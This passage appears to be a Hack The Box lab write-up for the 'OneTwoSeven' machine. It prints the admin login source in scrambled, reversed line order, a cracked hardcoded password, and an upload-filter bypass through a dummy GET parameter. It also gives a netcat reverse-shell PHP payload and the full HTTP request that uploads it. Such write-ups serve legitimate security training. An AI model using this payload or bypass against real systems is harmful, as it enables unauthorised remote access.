  <span class="o">&lt;</span><span class="n">div</span> <span class="n">id</span><span class="o">=</span><span class="s2">"myCarousel"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"carousel slide"</span> <span class="n">data</span><span class="o">-</span><span class="n">ride</span><span class="o">=</span><span class="s2">"carousel"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">main</span> <span class="n">role</span><span class="o">=</span><span class="s2">"main"</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">header</span><span class="o">&gt;</span>
  <span class="o">&lt;/</span><span class="n">nav</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"collapse navbar-collapse"</span> <span class="n">id</span><span class="o">=</span><span class="s2">"navbarCollapse"</span><span class="o">&gt;</span>
    <span class="o">&lt;/</span><span class="n">button</span><span class="o">&gt;</span>
      <span class="o">&lt;</span><span class="n">span</span> <span class="n">class</span><span class="o">=</span><span class="s2">"navbar-toggler-icon"</span><span class="o">&gt;&lt;/</span><span class="n">span</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">button</span> <span class="n">class</span><span class="o">=</span><span class="s2">"navbar-toggler"</span> <span class="n">type</span><span class="o">=</span><span class="s2">"button"</span> <span class="n">data</span><span class="o">-</span><span class="n">toggle</span><span class="o">=</span><span class="s2">"collapse"</span> <span class="n">data</span><span class="o">-</span><span class="n">target</span><span class="o">=</span><span class="s2">"#navbarCollapse"</span> <span class="n">aria</span><span class="o">-</span><span class="n">controls</span><span class="o">=</span><span class="s2">"navbarCollapse"</span> <span class="n">aria</span><span class="o">-</span><span class="n">expanded</span><span class="o">=</span><span class="s2">"false"</span> <span class="n">aria</span><span class="o">-</span><span class="n">label</span><span class="o">=</span><span class="s2">"Toggle navigation"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">a</span> <span class="n">class</span><span class="o">=</span><span class="s2">"navbar-brand"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"/login.php"</span><span class="o">&gt;</span><span class="nc">OneTwoSeven</span> <span class="o">-</span> <span class="nc">Administration</span> <span class="nc">Backend</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="n">nav</span> <span class="n">class</span><span class="o">=</span><span class="s2">"navbar navbar-expand-md navbar-dark fixed-top bg-dark"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">header</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
  <span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">link</span> <span class="n">href</span><span class="o">=</span><span class="s2">"carousel.css"</span> <span class="n">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span><span class="o">&gt;</span>
    <span class="o">&lt;!--</span> <span class="nc">Custom</span> <span class="n">styles</span> <span class="k">for</span> <span class="n">this</span> <span class="n">template</span> <span class="o">--&gt;</span>
    <span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;</span>
      <span class="o">@</span><span class="nf">media</span> <span class="p">(</span><span class="n">min</span><span class="o">-</span><span class="n">width</span><span class="o">:</span> <span class="mi">768</span><span class="n">px</span><span class="p">)</span> <span class="p">{</span> <span class="mf">.</span><span class="n">bd</span><span class="o">-</span><span class="n">placeholder</span><span class="o">-</span><span class="n">img</span><span class="o">-</span><span class="n">lg</span> <span class="p">{</span> <span class="n">font</span><span class="o">-</span><span class="n">size</span><span class="o">:</span> <span class="mf">3.5</span><span class="n">rem</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
      <span class="mf">.</span><span class="n">bd</span><span class="o">-</span><span class="n">placeholder</span><span class="o">-</span><span class="n">img</span> <span class="p">{</span> <span class="n">font</span><span class="o">-</span><span class="n">size</span><span class="o">:</span> <span class="mf">1.125</span><span class="n">rem</span><span class="p">;</span> <span class="n">text</span><span class="o">-</span><span class="n">anchor</span><span class="o">:</span> <span class="n">middle</span><span class="p">;</span> <span class="o">-</span><span class="n">webkit</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="n">none</span><span class="p">;</span> <span class="o">-</span><span class="n">moz</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="n">none</span><span class="p">;</span> <span class="o">-</span><span class="n">ms</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="n">none</span><span class="p">;</span> <span class="n">user</span><span class="o">-</span><span class="n">select</span><span class="o">:</span> <span class="n">none</span><span class="p">;</span> <span class="p">}</span>
    <span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">link</span> <span class="n">href</span><span class="o">=</span><span class="s2">"/dist/css/bootstrap.min.css"</span> <span class="n">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="n">crossorigin</span><span class="o">=</span><span class="s2">"anonymous"</span><span class="o">&gt;</span>
    <span class="o">&lt;!--</span> <span class="nc">Bootstrap</span> <span class="n">core</span> <span class="no">CSS</span> <span class="o">--&gt;</span>
    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="nc">OneTwoSeven</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"generator"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"Jekyll v3.8.5"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"Mark Otto, Jacob Thornton, and Bootstrap contributors"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="n">content</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1, shrink-to-fit=no"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
<span class="o">&lt;!</span><span class="n">doctype</span> <span class="n">html</span><span class="o">&gt;</span>
<span class="o">&lt;?</span><span class="n">php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="k">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /menu.php"</span><span class="p">);</span> <span class="p">}</span> <span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_PORT'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">60080</span> <span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="cp">?&gt;</span>
<span class="nt">&lt;/html&gt;</span>
      <span class="nt">&lt;script&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">jQuery</span> <span class="o">||</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"&gt;&lt;</span><span class="se">\</span><span class="s1">/script&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;script </span><span class="na">src=</span><span class="s">"dist/js/bootstrap.bundle.min.js"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;&lt;/body&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.3.1.slim.min.js"</span> <span class="na">integrity=</span><span class="s">"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/main&gt;</span>
  <span class="nt">&lt;/footer&gt;</span>
    <span class="nt">&lt;p&gt;</span><span class="ni">&amp;copy;</span> 2019 OneTwoSeven, Dec. <span class="ni">&amp;middot;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Privacy<span class="nt">&lt;/a&gt;</span> <span class="ni">&amp;middot;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Terms<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"float-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Back to top<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
  <span class="nt">&lt;footer</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
  <span class="c">&lt;!-- FOOTER --&gt;</span>
  <span class="nt">&lt;/div&gt;</span><span class="c">&lt;!-- /.container --&gt;</span>
    <span class="c">&lt;!-- /END THE FEATURETTES --&gt;</span>
    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"featurette-divider"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
	     <span class="nt">&lt;/div&gt;</span>
         <span class="nt">&lt;/form&gt;</span>
            <span class="nt">&lt;/table&gt;</span>
              <span class="nt">&lt;tr&gt;&lt;td</span> <span class="na">colspan=</span><span class="s">"2"</span><span class="nt">&gt;&lt;center&gt;&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"login"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/button&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;</span>
              <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Password:<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">required</span><span class="nt">&gt;&lt;/td&gt;&lt;/tr&gt;</span>
              <span class="nt">&lt;tr&gt;&lt;td&gt;&lt;b&gt;</span>Username:<span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">required</span> <span class="na">autofocus</span><span class="nt">&gt;&lt;/td&gt;&lt;/tr&gt;</span>
	    <span class="nt">&lt;table&gt;</span>
            <span class="nt">&lt;h4</span> <span class="na">class = </span><span class="s">"form-signin-heading"</span><span class="nt">&gt;&lt;font</span> <span class="na">size=</span><span class="s">"-1"</span> <span class="na">color=</span><span class="s">"red"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/font&gt;&lt;/h4&gt;</span>
         <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
      
      <span class="nt">&lt;div</span> <span class="na">class = </span><span class="s">"container"</span><span class="nt">&gt;</span>
      
      <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- /container --&gt;</span>
         ?&gt;
            }
              }
                  $msg = 'Wrong username or password.';
              } else {
		  header("Location: /menu.php");
                  $_SESSION['username'] = 'ots-admin';
</code></pre></div></div>
<p>The credentials are hardcoded, however the password is hashed :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'ots-admin'</span> <span class="o">&amp;&amp;</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">==</span> <span class="s1">'11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8'</span><span class="p">)</span> <span class="p">{</span> 
</code></pre></div></div>
<p><a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">Crackstation</a> was able to crack it :
<br><img src="/images/hackthebox/onetwoseven/17.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">ots-admin : Homesweethome1</code> :
<br><img src="/images/hackthebox/onetwoseven/18.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/19.png" alt="" class="align-center"><br><br>
There’s a plugin upload form and some installed plugins above it, additionally there’s a small button to download the module’s <code class="language-plaintext highlighter-rouge">php</code> source from the directory <code class="language-plaintext highlighter-rouge">/addons</code>:
<br><img src="/images/hackthebox/onetwoseven/20.png" alt="" class="align-center"><br><br>
If we can upload plugins then we got <code class="language-plaintext highlighter-rouge">RCE</code>, the form submit button is disabled but we can easily change that :
<br><img src="/images/hackthebox/onetwoseven/21.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/22.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/23.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/24.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">rev.php</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/onetwoseven/25.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/onetwoseven/26.png" alt="" class="align-center"><br><br>
It sent the request to <code class="language-plaintext highlighter-rouge">addon-upload.php</code> and the response was 404.<br></p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/addon-upload.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:60080</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------171386507112993851681929761040</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">326</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>


-----------------------------171386507112993851681929761040

Content-Disposition: form-data; name="addon"; filename="rev.php"
Content-Type: application/x-php

&lt;?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
?&gt;

-----------------------------171386507112993851681929761040--
</code></pre></div></div>
<p>If we check the <code class="language-plaintext highlighter-rouge">Addon manager</code> plugin we can see some interesting things :
<br><img src="/images/hackthebox/onetwoseven/27.png" alt="" class="align-center"><br><br>
First thing is the rewrite rules, any request sent to <code class="language-plaintext highlighter-rouge">addon-upload.php</code> and <code class="language-plaintext highlighter-rouge">addon-download.php</code> gets sent to <code class="language-plaintext highlighter-rouge">addons/ots-man-addon.php</code>. There’s also a small note that says “Disabling a feature through htaccess leads to 404 errors for now.”, This explains why we got 404 when attempting to upload a plugin, however the download feature isn’t disabled and I was able to download the <code class="language-plaintext highlighter-rouge">Addon manager</code> plugin :
<br><img src="/images/hackthebox/onetwoseven/28.png" alt="" class="align-center"><br><br>
Since both requests to <code class="language-plaintext highlighter-rouge">addon-upload.php</code> and <code class="language-plaintext highlighter-rouge">addon-download.php</code> go to <code class="language-plaintext highlighter-rouge">ots-man-addon.php</code>, we have to find a way to exploit <code class="language-plaintext highlighter-rouge">ots-man-addon.php</code> and just use <code class="language-plaintext highlighter-rouge">addon-download.php</code> because it’s not disabled.<br>
<code class="language-plaintext highlighter-rouge">ots-man-addon.php</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /login.php"</span><span class="p">);</span> <span class="p">};</span> <span class="k">if</span> <span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">],</span> <span class="s1">'/addons/'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">};</span>
<span class="c1"># OneTwoSeven Admin Plugin</span>
<span class="c1"># OTS Addon Manager</span>
<span class="k">switch</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1"># Upload addon to addons folder.</span>
	<span class="k">case</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\/addon-upload.php/'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">])</span><span class="o">:</span>
		<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">])){</span>
			<span class="nv">$errors</span><span class="o">=</span> <span class="k">array</span><span class="p">();</span>
			<span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
			<span class="nv">$file_size</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">];</span>
			<span class="nv">$file_tmp</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span>

			<span class="k">if</span><span class="p">(</span><span class="nv">$file_size</span> <span class="o">&gt;</span> <span class="mi">20000</span><span class="p">){</span>
				<span class="nv">$errors</span><span class="p">[]</span><span class="o">=</span><span class="s1">'Module too big for addon manager. Please upload manually.'</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="k">if</span><span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$errors</span><span class="p">)</span><span class="o">==</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
				<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file_tmp</span><span class="p">,</span><span class="nv">$file_name</span><span class="p">);</span>
				<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /menu.php"</span><span class="p">);</span>
				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain"</span><span class="p">);</span>
				<span class="k">echo</span> <span class="s2">"File uploaded successfull.y"</span><span class="p">;</span>
			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
				<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /menu.php"</span><span class="p">);</span>
				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain"</span><span class="p">);</span>
				<span class="k">echo</span> <span class="s2">"Error uploading the file: "</span><span class="p">;</span>
				<span class="nb">print_r</span><span class="p">(</span><span class="nv">$errors</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="c1"># Download addon from addons folder.</span>
	<span class="k">case</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\/addon-download.php/'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">])</span><span class="o">:</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">])</span> <span class="p">{</span>
			<span class="nv">$addon_file</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">]);</span>
			<span class="k">if</span> <span class="p">(</span> <span class="nb">file_exists</span><span class="p">(</span><span class="nv">$addon_file</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Disposition: attachment; filename=</span><span class="nv">$addon_file</span><span class="s2">"</span><span class="p">);</span>
				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain"</span><span class="p">);</span>
				<span class="nb">readfile</span><span class="p">(</span><span class="nv">$addon_file</span><span class="p">);</span>
			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
				<span class="nb">header</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"SERVER_PROTOCOL"</span><span class="p">]</span><span class="mf">.</span><span class="s2">" 404 Not Found"</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="mi">404</span><span class="p">);</span>
				<span class="k">die</span><span class="p">();</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">default</span><span class="o">:</span>
		<span class="k">echo</span> <span class="s2">"The addon manager must not be executed directly but only via"</span><span class="p">;</span>
		<span class="k">echo</span> <span class="s2">"the provided RewriteRules:"</span><span class="p">;</span>
		<span class="k">echo</span> <span class="s2">"RewriteEngine On"</span><span class="p">;</span>
		<span class="k">echo</span> <span class="s2">"RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]"</span><span class="p">;</span>
		<span class="k">echo</span> <span class="s2">"RewriteRule ^addon-download.php addons/ots-man-addon.php [L]"</span><span class="p">;</span>
		<span class="k">echo</span> <span class="s2">"By commenting individual RewriteRules you can disable single"</span><span class="p">;</span>
		<span class="k">echo</span> <span class="s2">"features (i.e. for security reasons)"</span><span class="p">;</span>
		<span class="k">echo</span> <span class="s2">"&lt;font size='-2'&gt;Please note: Disabling a feature through htaccess leads to 404 errors for now.&lt;/font&gt;"</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>This part of the code tells us what we need to do :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">case</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\/addon-upload.php/'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">])</span><span class="o">:</span>
		<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">])){</span>
			<span class="nv">$errors</span><span class="o">=</span> <span class="k">array</span><span class="p">();</span>
			<span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
			<span class="nv">$file_size</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">];</span>
			<span class="nv">$file_tmp</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span>

			<span class="k">if</span><span class="p">(</span><span class="nv">$file_size</span> <span class="o">&gt;</span> <span class="mi">20000</span><span class="p">){</span>
				<span class="nv">$errors</span><span class="p">[]</span><span class="o">=</span><span class="s1">'Module too big for addon manager. Please upload manually.'</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="k">if</span><span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$errors</span><span class="p">)</span><span class="o">==</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
				<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file_tmp</span><span class="p">,</span><span class="nv">$file_name</span><span class="p">);</span>
				<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /menu.php"</span><span class="p">);</span>
				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain"</span><span class="p">);</span>
				<span class="k">echo</span> <span class="s2">"File uploaded successfull.y"</span><span class="p">;</span>
</code></pre></div></div>
<p>We need to have <code class="language-plaintext highlighter-rouge">/addon-upload.php</code> in the request URI, we can’t request <code class="language-plaintext highlighter-rouge">/addon-upload.php</code> directly because it’s disabled but we can just put a useless <code class="language-plaintext highlighter-rouge">GET</code> parameter with the value <code class="language-plaintext highlighter-rouge">/addon-upload.php</code>,  and it will pass the check.<br>
It takes the addon name from the <code class="language-plaintext highlighter-rouge">GET</code> parameter <code class="language-plaintext highlighter-rouge">addon</code> so we have to add that parameter to the request URI.<br>
So the request URI looks like this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/addon-download.php?addon=addons/rev.php&amp;test=/addon-upload.php
</code></pre></div></div>
<p>Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/addon-download.php?addon=addons/rev.php&amp;test=/addon-upload.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:60080</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------171386507112993851681929761040</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">326</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>


-----------------------------171386507112993851681929761040

Content-Disposition: form-data; name="addon"; filename="rev.php"
Content-Type: application/x-php

&lt;?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
?&gt;

-----------------------------171386507112993851681929761040--
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 29 Aug 2019 20:56:24 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.25 (Debian)</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">/menu.php</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">27</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/plain;charset=UTF-8</span>


File uploaded successfull.y
</code></pre></div></div>
<p>Now if we check <code class="language-plaintext highlighter-rouge">/addons</code>, <code class="language-plaintext highlighter-rouge">rev.php</code> is there :
